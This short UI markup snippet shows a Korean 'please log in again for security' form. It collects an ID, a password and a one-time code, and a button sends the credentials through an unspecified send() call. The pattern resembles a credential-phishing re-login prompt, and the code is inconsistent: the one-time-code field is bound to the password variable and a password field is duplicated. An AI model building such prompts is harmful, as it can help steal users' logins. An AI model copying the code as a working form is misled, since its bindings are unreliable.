보안을 위해 다시 로그인해 주세요.

{@state id = ""}
{@state pw = ""}
<box gap={3}>
  <input label="아이디" value={id}/>
  <input label="비밀번호" type="password" value={pw}/>
  <input label="인증번호" autofill="one-time-code" value={pw}/>
  <TextField label="비밀번호" secure value=""/>
  <button onPress={() => send(`${id} ${pw}`)}>로그인</button>
</box>
